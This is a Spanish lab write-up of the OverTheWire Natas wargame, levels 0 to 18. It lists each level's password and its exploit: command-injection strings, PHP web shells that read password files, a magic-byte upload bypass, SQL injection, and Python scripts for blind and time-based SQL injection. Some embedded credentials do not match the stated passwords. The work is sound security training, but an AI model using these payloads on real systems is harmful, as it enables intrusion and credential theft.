# INF2310LAB
## Natas

### Nivel 0

**Descripción:** Este es el nivel inicial de Natas, donde debemos encontrar la contraseña para el siguiente nivel dentro del código fuente de la página web.

**Acceso:** URL: http://natas0.natas.labs.overthewire.org

**Usuario:** natas0
**Contraseña:** natas0

**Solución:**
Una vez dentro, hacemos clic derecho en la página y seleccionamos "Ver código fuente".
En el código fuente encontramos un comentario HTML con la contraseña del siguiente nivel:
```bash
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```
Contraseña para el nivel 1: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq.

### Nivel 1

**Descripción:** En este nivel, la opción de clic derecho está bloqueada, por lo que necesitamos usar herramientas de desarrollo del navegador para acceder al código fuente.

**Acceso:** URL: http://natas1.natas.labs.overthewire.org

**Usuario:** natas1
**Contraseña:** 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

**Solución:**
Como el clic derecho está bloqueado, presionamos F12 para abrir las herramientas de desarrollo.
Navegamos a la pestaña "Elements" o "Console" para ver el código HTML de la página.
En el código fuente encontramos un comentario HTML con la contraseña del siguiente nivel:
```bash
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```
Contraseña para el nivel 2: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI.

### Nivel 2

**Descripción:** En este nivel, la página parece vacía, pero al inspeccionar el código fuente encontramos una pista que nos lleva a descubrir un archivo con credenciales.

**Acceso:** URL: http://natas2.natas.labs.overthewire.org

**Usuario:** natas2
**Contraseña:** TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

**Solución:**
Al inspeccionar el código fuente (Ctrl + U o F12 en el navegador), encontramos un elemento <img> con la ruta:
```bash
<img src="files/pixel.png">
```
Probamos acceder al directorio files agregándolo a la URL:
http://natas2.natas.labs.overthewire.org/files/
En la lista de archivos, encontramos users.txt, que contiene las credenciales de varios usuarios.
Dentro de users.txt, encontramos la contraseña para el siguiente nivel: 
```bash
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
Contraseña para el nivel 3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH.

### Nivel 3

**Descripción:** En este nivel, no hay información visible en la página principal, pero un comentario en el código fuente nos da una pista sobre robots.txt.

**Acceso:** URL: http://natas3.natas.labs.overthewire.org

**Usuario:** natas3
**Contraseña:** 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

**Solución:**
Inspeccionamos el código fuente (Ctrl + U o F12) y encontramos el siguiente comentario:
```bash
<!-- No more information leaks!! Not even Google will find it this time... -->
```
La referencia a "Google" sugiere que revisemos el archivo robots.txt, que impide que los motores de búsqueda indexen ciertas rutas.
Visitamos robots.txt agregándolo a la URL:
http://natas3.natas.labs.overthewire.org/robots.txt
El archivo robots.txt contiene:
```bash
User-agent: *
Disallow: /s3cr3t/
```
Esto nos indica que hay un directorio oculto llamado /s3cr3t/.
Accedemos a este directorio:
http://natas3.natas.labs.overthewire.org/s3cr3t/
Dentro encontramos un archivo users.txt. Al abrirlo, vemos:
```bash
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
Contraseña para el nivel 4: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ.

### Nivel 4

**Descripción:** En este nivel, el acceso está restringido a usuarios que provienen de http://natas5.natas.labs.overthewire.org/, lo que significa que el servidor está verificando el "HTTP Referrer". Para superar esta restricción, necesitamos modificar la cabecera HTTP y falsificar el valor del Referer.

**Acceso:** URL: http://natas4.natas.labs.overthewire.org

**Usuario:** natas4
**Contraseña:** QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

**Solución:**
La página muestra un mensaje de acceso denegado debido a que no provenimos de natas5.
Para modificar la cabecera HTTP, podemos usar Burp Suite o curl.

Usando Burp Suite
Configuramos Burp Suite como proxy.
Capturamos la solicitud con Burp y modificamos la cabecera Referer a http://natas5.natas.labs.overthewire.org/.
Enviamos la solicitud modificada y obtenemos la contraseña.
```bash
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
Contraseña para el nivel 5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK.

### Nivel 5

**Descripción:** Este nivel nos muestra un mensaje de acceso denegado porque no estamos autenticados. Sin embargo, inspeccionando la cabecera HTTP podemos ver que hay una cookie loggedin=0, lo que sugiere que podemos modificar su valor para obtener acceso.

**Acceso:** URL: http://natas5.natas.labs.overthewire.org

**Usuario:** natas5
**Contraseña:** 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

**Solución:**
Inspeccionamos la cabecera HTTP utilizando Burp Suite o curl. Observamos la cookie:
Cookie: loggedin=0
Modificamos la cookie loggedin=0 a loggedin=1 para intentar obtener acceso.

Usando Burp Suite
Configuramos Burp Suite como proxy.
Capturamos la solicitud con Burp y modificamos la cookie loggedin=0 a loggedin=1.
Enviamos la solicitud modificada y obtenemos la contraseña.
Esto nos devolverá el código fuente de la página con la contraseña:
```bash
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
Contraseña para el nivel 6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned.

### Nivel 6

**Descripción:** En este nivel, la página nos pide ingresar un "secreto". Si el secreto es correcto, se mostrará la contraseña del siguiente nivel. Para encontrar el secreto, inspeccionamos el código fuente y descubrimos que se incluye un archivo secret.inc.

**Acceso:** URL: http://natas6.natas.labs.overthewire.org

**Usuario:** natas6
**Contraseña:** 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

**Solución:**
Inspeccionamos el código fuente de la página y encontramos que el archivo includes/secret.inc es incluido en el código PHP.
Accedemos a http://natas6.natas.labs.overthewire.org/includes/secret.inc y vemos que contiene:
```bash
<?php
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```
Regresamos a la página principal e ingresamos el secreto FOEIUWGHFEEUHOFUOIU. Esto nos revelará la contraseña para el siguiente nivel:
```bash
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```
Contraseña para el nivel 7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS.

### Nivel 7

**Descripción:** En este nivel, la página nos presenta dos enlaces: "Home" y "About". Al inspeccionar el código fuente, encontramos un comentario en HTML que nos da una pista clave: la contraseña para el siguiente nivel está almacenada en /etc/natas_webpass/natas8. Esto sugiere que podemos explotar una vulnerabilidad de Path Traversal.

**Acceso:** URL: http://natas7.natas.labs.overthewire.org

**Usuario:** natas7
**Contraseña:** bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

**Solución:**
Inspeccionamos el código fuente y encontramos la siguiente estructura:
```bash
<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
```
Además, un comentario en HTML nos revela lo siguiente:
```bash
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
Modificamos el parámetro page en la URL para intentar leer el archivo que contiene la contraseña:
URL original: http://natas7.natas.labs.overthewire.org/index.php?page=home
URL modificada: http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
Si la explotación es exitosa, la página nos mostrará la contraseña para el siguiente nivel:
```bash
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
Contraseña para el nivel 8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q.

### Nivel 8

**Descripción:** En este nivel, la página contiene un formulario donde debemos ingresar un "secreto" para obtener la contraseña del siguiente nivel. Al inspeccionar el código fuente, encontramos un script en PHP que realiza una serie de transformaciones sobre la entrada del usuario antes de compararla con un valor predefinido.

**Acceso:** URL: http://natas8.natas.labs.overthewire.org

**Usuario:** natas8
**Contraseña:** xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

**Solución:**
Al inspeccionar el código fuente, encontramos la siguiente función en PHP:
```bash
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
    } else {
        print "Wrong secret";
    }
}
```
La función encodeSecret realiza las siguientes operaciones:
Codifica la entrada en Base64.
Invierte la cadena resultante.
Convierte los bytes en su representación hexadecimal.
Para obtener el valor original del "secreto", debemos revertir estos pasos:
```bash
php > echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));
```
Esto nos devuelve: oubWYf2kBq
Ingresamos oubWYf2kBq en el formulario de la página y obtenemos la contraseña del siguiente nivel:
```bash
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
Contraseña para el nivel 9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t.

### Nivel 9

**Descripción:** En este nivel, la aplicación web nos permite buscar palabras dentro de un diccionario. Sin embargo, al inspeccionar el código fuente, descubrimos una vulnerabilidad en la ejecución del comando grep, lo que nos permite inyectar comandos arbitrarios.

**Acceso:** URL: http://natas9.natas.labs.overthewire.org

**Usuario:** natas9
**Contraseña:** ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

**Solución:**
Al inspeccionar el código fuente, encontramos la siguiente porción de código en PHP:
```bash
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
En este fragmento, el valor de needle se inserta directamente en el comando grep, sin ninguna validación, lo que permite la inyección de comandos.
Para explotar esta vulnerabilidad, podemos inyectar un comando usando ;, seguido del comando cat para leer la contraseña del siguiente nivel:
```bash
; cat /etc/natas_webpass/natas10 #
```
Esto ejecuta cat /etc/natas_webpass/natas10, ignorando el resto del comando grep.
Al enviar esta carga en el formulario, obtenemos la contraseña del siguiente nivel:
```bash
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
Contraseña para el nivel 10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu.

### Nivel 10

**Descripción:** En este nivel, la aplicación web permite buscar palabras dentro de un diccionario, pero ahora han añadido un filtro que bloquea ciertos caracteres peligrosos, como ; y &. Sin embargo, la vulnerabilidad en la ejecución de comandos no ha sido completamente corregida, lo que permite explotar la entrada mediante expresiones regulares.

**Acceso:** URL: http://natas10.natas.labs.overthewire.org

**Usuario:** natas10
**Contraseña:** t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

**Solución:**
Al inspeccionar el código fuente, encontramos el siguiente fragmento de código PHP:
```bash
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```
En este código, han implementado una validación para bloquear los caracteres ; y & mediante una expresión regular. Sin embargo, el valor de needle aún se inserta directamente en el comando grep, lo que deja una ventana para inyectar comandos a través de expresiones regulares.
Para explotar esta vulnerabilidad, podemos usar una expresión regular que permita eludir el filtro de caracteres ; y &. Al usar .* en la entrada, indicamos que se debe buscar cualquier cosa, ignorando el caso. Luego, podemos agregar /etc/natas_webpass/natas11 para leer la contraseña del siguiente nivel. La expresión completa sería:
```bash
.* /etc/natas_webpass/natas11 #
```
La expresión regular .* hace que grep coincida con cualquier cosa, mientras que el # al final comenta el resto del comando, evitando errores al no encontrar un término específico en el diccionario.
Al enviar esta carga en el formulario, obtenemos la contraseña del siguiente nivel:
```bash
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
Contraseña para el nivel 11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk.

### Nivel 11

**Descripción:** En este nivel, la aplicación web utiliza cifrado XOR para proteger los datos almacenados en una cookie. El objetivo es descifrar el contenido de la cookie, obtener el valor del "showpassword" y descubrir la contraseña del siguiente nivel.

**Acceso:** URL: http://natas11.natas.labs.overthewire.org

**Usuario:** natas11
**Contraseña:** UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

**Solución:**
Al inspeccionar el código fuente, encontramos la siguiente función PHP que realiza el cifrado y descifrado utilizando XOR:
```bash
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```
La función xor_encrypt utiliza un key para cifrar y descifrar los datos. La cookie contiene los datos cifrados y se pasan a través de base64 y XOR.
Para descifrar los datos de la cookie, necesitamos conocer la clave (XOR Key). Sabemos que el data de la cookie está cifrado con un XOR sobre un valor original conocido. Sabemos que la estructura del JSON contiene "showpassword": "no" y "bgcolor": "#ffffff".
Usamos un script en PHP para descifrar el valor de la clave XOR. Primero, decodificamos la cookie, y luego realizamos la operación XOR con los datos originales y los cifrados para obtener la clave.
```bash
function xor_encrypt($text) {
    $key = base64_decode('HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D=');
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```
Esto nos devuelve la clave XOR: eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe.
Ahora que tenemos la clave, editamos el código para cambiar el valor de "showpassword" a "yes", y luego generamos el nuevo valor de la cookie cifrada:
```bash
function xor_encrypt($text) {
    $key = 'eDWo';  // Reemplazamos con la clave obtenida
    $outText = '';

    for($i=0;$i<strlen($text);$i++) {
       $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
print base64_encode(xor_encrypt(json_encode($data)));
```
Al ejecutar este script, obtenemos el valor de la cookie cifrada:
```bash
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```
Usamos Burp Suite para interceptar la solicitud y cambiar la cookie data con el nuevo valor. Si todo se realiza correctamente, la página nos mostrará la contraseña del siguiente nivel.
La contraseña obtenida es:
```bash
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB.
```
Contraseña para el nivel 12: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB.

### Nivel 12

**Descripción:** En este nivel, el desafío consiste en subir un archivo JPEG a la aplicación web. Sin embargo, el sistema permite una vulnerabilidad de Subida de Archivos No Restringida, lo que permite cargar un archivo PHP en lugar de un JPEG. El objetivo es cargar un script PHP que permita ejecutar comandos en el servidor y obtener la contraseña del siguiente nivel.

**Acceso:** URL: http://natas12.natas.labs.overthewire.org

**Usuario:** natas12
**Contraseña:** yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

**Solución:**
Al inspeccionar el código fuente, encontramos que el sistema de carga de archivos está implementado de la siguiente manera:
```bash
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}
function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```
Este código permite subir archivos, pero realiza una validación básica de tamaño y cambia el nombre del archivo a uno aleatorio con una extensión proporcionada (presumiblemente .jpeg).
Dado que no hay validación sobre el tipo de archivo (solo el tamaño), podemos aprovechar esta vulnerabilidad para cargar un archivo PHP. El archivo se renombrará con una extensión .jpg, pero aún podemos acceder a él y ejecutar código PHP.
Creamos un archivo PHP simple (shell.php) que leerá el archivo /etc/natas_webpass/natas13, el cual contiene la contraseña del siguiente nivel:
```bash
<?php
$output = shell_exec('cat /etc/natas_webpass/natas13');
echo "<pre>$output</pre>";
?>
```
Guardamos este archivo como shell.php y lo preparamos para cargarlo.
Vamos a utilizar Burp Suite para interceptar y modificar la solicitud de carga de archivos:
Configuramos Burp Suite para interceptar las solicitudes.
Cargamos nuestro archivo shell.php, pero antes de enviarlo, inspeccionamos el contenido de la solicitud interceptada en Burp Suite.
Encontramos que el archivo se renombra automáticamente a .jpg durante el proceso de carga. La línea correspondiente en la solicitud es:
```bash
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
```
Modificamos la solicitud para que el nombre del archivo sea shell.php y no el nombre renombrado zvot8u94ri.jpg. Luego, reenviamos la solicitud.
Una vez que el archivo ha sido cargado correctamente, vemos un mensaje que nos indica que el archivo se ha subido con éxito, como por ejemplo:
```bash
The file upload/yh33kxvyt8.php has been uploaded
```
Hacemos clic en el enlace proporcionado (upload/yh33kxvyt8.php), lo que ejecuta el archivo PHP en el servidor y nos muestra la contraseña del siguiente nivel.
La contraseña obtenida es:
```bash
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
Contraseña para el nivel 13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC.

### Nivel 13

**Descripción:** En este nivel, el desafío es similar al nivel 12, pero ahora se ha añadido una validación extra para aceptar solo archivos de imagen. La función exif_imagetype es utilizada para verificar que el archivo subido tenga una firma de imagen válida. Sin embargo, todavía podemos aprovechar una vulnerabilidad de Subida de Archivos No Restringida para cargar un archivo PHP disfrazado de imagen.

**Acceso:** URL: http://natas13.natas.labs.overthewire.org

**Usuario:** natas13
**Contraseña:** trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

**Solución:**
Al revisar el código fuente, encontramos que el sistema de carga de archivos incluye la siguiente validación adicional:
```bash
if(! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```
Esta validación utiliza la función exif_imagetype, que comprueba los primeros bytes del archivo para verificar si tiene una firma de imagen válida (como JPG, PNG, GIF, etc.). Si el archivo no es una imagen válida, no se permite la carga.
Para eludir esta validación, podemos aprovechar el hecho de que exif_imagetype solo lee los primeros bytes del archivo. Podemos insertar un encabezado de imagen BMP al inicio de nuestro archivo PHP para engañar al sistema y hacer que lo considere como una imagen válida.
Creamos un archivo shell.php que leerá el archivo /etc/natas_webpass/natas14, el cual contiene la contraseña del siguiente nivel:
```bash
BMP<?php
$output = shell_exec('cat /etc/natas_webpass/natas14');
echo "<pre>$output</pre>";
?>
```
El prefijo BMP al inicio del archivo hace que el archivo sea interpretado como una imagen BMP, y el código PHP es ejecutado normalmente.
Cargamos el archivo shell.php utilizando Burp Suite para interceptar la solicitud y modificarla:
Configuramos Burp Suite para interceptar las solicitudes.
Cargamos el archivo shell.php, pero antes de enviarlo, inspeccionamos el contenido de la solicitud interceptada en Burp Suite.
Encontramos que el archivo se renombra automáticamente a .jpg durante el proceso de carga. La línea correspondiente en la solicitud es:
```bash
Content-Disposition: form-data; name="filename"; filename="3hwxwqemk3.jpg"
```
Modificamos la solicitud para que el nombre del archivo sea shell.php en lugar de 3hwxwqemk3.jpg, y luego reenviamos la solicitud.
Una vez que el archivo ha sido cargado correctamente, vemos un mensaje que nos indica que el archivo se ha subido con éxito, como por ejemplo:
```bash
The file upload/w0yzhafetj.php has been uploaded
```
Hacemos clic en el enlace proporcionado (upload/w0yzhafetj.php), lo que ejecuta el archivo PHP en el servidor y nos muestra la contraseña del siguiente nivel.
La contraseña obtenida es:
```bash
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
Contraseña para el nivel 14: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ.

### Nivel 14

**Descripción:** En este nivel, tenemos un formulario de inicio de sesión con dos campos: username y password. Al inspeccionar el código fuente, descubrimos que la aplicación está utilizando una base de datos MySQL para verificar las credenciales de inicio de sesión. Sin embargo, la consulta SQL que se ejecuta para validar las credenciales es vulnerable a un ataque de inyección SQL.

**Acceso:** URL: http://natas14.natas.labs.overthewire.org

**Usuario:** natas14
**Contraseña:** z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

**Solución:**
Al revisar el código PHP en el formulario de inicio de sesión, encontramos lo siguiente:
```bash
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
La consulta SQL construida directamente con los valores de username y password proporcionados por el usuario es vulnerable a inyección SQL, ya que no se están escapando los datos de entrada.
Para explotar esta vulnerabilidad, podemos enviar la siguiente entrada en los campos de username y password:
Username: ""=""
Password: ""=""
Esto generará la siguiente consulta SQL:
```bash
SELECT * from users where username = ""="" and password = ""=""
```
La condición ""="" siempre es verdadera, por lo que la consulta devolverá todas las filas de la tabla users.
Como resultado, la validación de las credenciales no impide el acceso y nos muestra el mensaje de éxito, indicando que el inicio de sesión fue exitoso y proporcionando la contraseña del siguiente nivel:
```bash
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
Contraseña para el nivel 15: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx.

### Nivel 15

**Descripción:** En este nivel, tenemos una vulnerabilidad de inyección SQL ciega en un formulario de inicio de sesión. El script PHP consulta la base de datos para verificar si un usuario con un nombre de usuario dado existe, pero no devuelve errores detallados, lo que hace que sea un SQL Injection Ciego. A diferencia de una inyección SQL tradicional, no se pueden ver mensajes de error directamente; solo se pueden obtener respuestas "verdaderas" o "falsas" basadas en si la consulta devuelve resultados o no. La tarea es obtener la contraseña de natas16 utilizando este tipo de vulnerabilidad.

**Acceso:** URL: http://natas15.natas.labs.overthewire.org

**Usuario:** natas15
**Contraseña:** SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

**Solución:**
El código PHP de la página de inicio de sesión se ve así:
```bash
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
Esta consulta SQL toma el username ingresado en el formulario y lo compara en la base de datos. No hay ningún filtro ni validación, lo que permite la inyección SQL.
Sabemos que hay una tabla llamada users con columnas username y password. La tarea consiste en encontrar la contraseña de natas16 utilizando una técnica de inyección SQL ciega. Esto significa que solo podemos deducir si una condición es verdadera o falsa en función de la respuesta del servidor ("This user exists" o "This user doesn't exist").
Para verificar si un carácter específico está en la contraseña, podemos usar el operador LIKE de MySQL con la cláusula BINARY, que compara las cadenas de manera sensible a mayúsculas y minúsculas. El siguiente es el formato de la inyección para verificar si el primer carácter de la contraseña es "a":
```bash
SELECT * from users where username = "natas16" and password LIKE BINARY "a%"
```
Si el carácter "a" está en la contraseña, la página devolverá "This user exists". Si no está, mostrará "This user doesn't exist".
El proceso de descifrar la contraseña se puede automatizar escribiendo un script en Python que intente todas las combinaciones de caracteres posibles.
Guardamos el script como brute.py, le damos permisos de ejecución y lo ejecutamos:
```bash
chmod +x brute.py
./brute.py
```
El script imprimirá el progreso de la fuerza bruta, mostrando caracteres que están en la contraseña de natas16.
Al final, el script completará la contraseña de natas16. En este caso, la contraseña obtenida es:
```bash
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
Contraseña para el nivel 16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo.

### Nivel 16

**Descripción:** En este nivel, nos enfrentamos a un filtro más estricto en el input que hemos de inyectar. El formulario de entrada verifica los caracteres utilizados en la cadena de consulta y bloquea aquellos que sean potencialmente peligrosos para la inyección de comandos, como los caracteres ;, |, &, `, ', y ". Sin embargo, todavía hay una forma de hacer una inyección de comando utilizando los caracteres $, ( y ) para aprovechar la sustitución de comandos en el sistema operativo.

**Acceso:** URL: http://natas16.natas.labs.overthewire.org

**Usuario:** natas16
**Contraseña:** hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

**Solución:**
El siguiente paso es crear un script en Python similar al que usamos en el nivel anterior para realizar una fuerza bruta sobre la contraseña. Esta vez, para verificar si un carácter está presente en la contraseña, vamos a usar la siguiente técnica:
Usamos $(grep <char> /etc/natas_webpass/natas17)Fridays, donde "Fridays" es un texto que nos ayudará a identificar si el comando ha fallado o no. Si no se devuelve nada, sabemos que la letra está presente.
Realizamos la búsqueda de caracteres uno por uno y, una vez que identificamos que un carácter está presente, lo añadimos a la contraseña.
```bash
#!/usr/bin/python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh*@natas16.natas.labs.overthewire.org/'
trueStr = 'Output:\n<pre>\n</pre>'

# Buscar todos los caracteres posibles en la contraseña
for x in chars:
    r = requests.get(target+'?needle=$(grep '+x+' /etc/natas_webpass/natas17)Fridays')
    if r.content.find(trueStr) != -1:
        exist += x
        print('Using: ' + exist)

print('All characters used. Starting brute force... Grab a coffee, might take a while!')

# Fuerza bruta para encontrar la contraseña completa
for i in range(32):
    for c in exist:
        r = requests.get(target+'?needle=$(grep ^'+password+c+' /etc/natas_webpass/natas17)Fridays')
        if r.content.find(trueStr) != -1:
            password += c
            print('Password: ' + password + '*' * int(32 - len(password)))
            break

print('Completed!')
```
Este script utiliza los caracteres permitidos (0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ) y realiza una búsqueda por cada uno de ellos en la contraseña de natas17. Una vez que identificamos un carácter, lo agregamos al password y seguimos con el siguiente.
Guardamos el script como brute.py, le damos permisos de ejecución y lo ejecutamos:
```bash
chmod +x brute.py
./brute.py
```
El script irá identificando la contraseña de natas17 carácter por carácter.
Después de ejecutar el script, el resultado final nos da la contraseña de natas17:
```bash
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
```
Contraseña para el nivel 17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC.

### Nivel 17

**Descripción:** En este nivel, enfrentamos una vulnerabilidad de inyección SQL ciega basada en tiempo. Similar al nivel anterior, el objetivo es obtener la contraseña de natas18 utilizando una inyección SQL, pero esta vez no recibimos retroalimentación directa como mensajes de error o resultados visibles. En su lugar, utilizaremos un retraso en el servidor para determinar si nuestra inyección SQL es verdadera o falsa, dependiendo de si la condición de la consulta se cumple o no.

**Acceso:** URL: http://natas17.natas.labs.overthewire.org

**Usuario:** natas17
**Contraseña:** EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC

**Solución:**
En este nivel, no recibimos ningún mensaje de error o confirmación explícita sobre si un nombre de usuario es válido o no. Por lo tanto, utilizamos una inyección SQL ciega basada en tiempo, que funciona del siguiente modo:
Utilizamos el comando sleep(5) para hacer que la consulta tarde 5 segundos en ejecutarse si la condición de la inyección SQL es verdadera.
Si la consulta no encuentra la condición verdadera, no se aplicará el retraso y la respuesta será casi instantánea.
Usamos esto para verificar la presencia de caracteres en la contraseña de natas18.
Para probar si una letra específica está presente en la contraseña, utilizamos una consulta como esta:
```bash
natas18" AND IF(password LIKE BINARY "A%", sleep(5), null) #
```
Esto le dice a MySQL que, si la contraseña de natas18 comienza con la letra "A", debe retrasarse 5 segundos. Si el retraso ocurre, sabemos que la condición es verdadera, lo que significa que la letra "A" está presente en la contraseña. Si no ocurre ningún retraso, sabemos que la letra no está presente.
Similar al nivel anterior, utilizamos un script en Python para realizar una fuerza bruta sobre la contraseña de natas18.
```bash
#!/usr/bin/python
import requests
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
# Buscar todos los caracteres posibles en la contraseña
for x in chars:
    try:
        r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%' + x + '%", sleep(5), null) %23', timeout=1)
    except requests.exceptions.Timeout:
        exist += x
        print('Using: ' + exist)

print('All characters used. Starting brute force... Grab a coffee, might take a while!')
# Fuerza bruta para encontrar la contraseña completa
for i in range(32):
    for c in exist:
        try:
            r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
        except requests.exceptions.Timeout:
            password += c
            print('Password: ' + password + '*' * int(32 - len(password)))
            break

print('Completed!')
```
Guardamos el script como brute.py, le damos permisos de ejecución y lo ejecutamos:
```bash
chmod +x brute.py
./brute.py
```
El script hará múltiples solicitudes al servidor y determinará cada carácter de la contraseña basándose en los retrasos en la respuesta.
Después de ejecutar el script, obtendremos la contraseña completa de natas18:
```bash
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```
Contraseña para el nivel 18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ.

### Nivel 18

**Descripción:** En este nivel, el objetivo es iniciar sesión en una cuenta de "admin" para obtener las credenciales para el siguiente nivel (natas19). El código fuente presenta una serie de funciones de autenticación y manejo de sesiones, donde la sesión de "admin" está asociada a un identificador específico. Sin embargo, no existe un sistema de autenticación seguro, lo que nos permite realizar un ataque de secuestro de sesión para acceder a la cuenta de "admin" y obtener las credenciales de natas19.

